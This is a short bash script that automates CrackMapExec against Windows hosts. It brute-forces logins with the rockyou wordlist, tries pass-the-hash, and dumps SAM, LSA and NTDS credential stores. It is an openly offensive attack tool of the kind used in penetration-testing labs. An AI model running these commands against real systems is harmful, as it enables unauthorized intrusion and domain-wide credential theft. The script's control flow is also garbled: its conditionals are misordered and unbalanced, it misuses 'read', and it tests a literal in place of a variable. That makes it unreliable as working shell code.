#!/bin/bash

# CrackMapExec Checklist & Automation Script

echo "{*} CrackMapExec Checklist & Automation Script {*}"
read -s 'Enter IP: ' ip
read -s 'Enter protocol (smb/mssql/winrm): ' protocol
if [ $protocol == 'smb' ]; then
    option='--local-auth'
fi
if [ $protocol == 'mssql' ]; then
    option='-a normal'
fi

read -s 'Enter username: ' user
if [ ! $user ]; then
    echo "No user defined: Using 'users.txt'"
    user='users.txt'

read 'Do you have a password or hash? ([P]ass/[H]ash/[N]o)' bfyn
if [ ! $bfyn ]; then
    read "Please make a selection ([P]ass/[H]ash/[N]o)" bfyn
fi
else
    echo "Exiting. No selection made."
    exit
if [ bfyn == 'N' ]; then
    echo "No password or hash defined. Using 'rockyou.txt'"
    pass='/usr/share/wordlists/rockyou.txt'
    crackmapexec $protocol $ip -u $user -p $pass
fi
elif [ bfyn == 'P' ]; then
    read -s 'Enter the password to pass: ' pass
    crackmapexec $protocol $ip -u $user -p $pass
    echo "Attempting to Dump Hashes"
    echo "[+] Dumping SAM"
    crackmapexec $protocol $ip -u $user -p $pass --sam
    echo "[+] Dumping NTDS"
    crackmapexec $protocol $ip -u $user -p $pass --ntds drsuapi
    echo "[+] Dumping LSA"
    crackmapexec $protocol $ip -u $user -p $pass --lsa
fi
elif [ bfyn == 'H' ]; then
    read -s 'Enter the hash to pass: ' hash
    crackmapexec $protocol $ip -u $user -H $hash
fi

echo "{ Complete }"
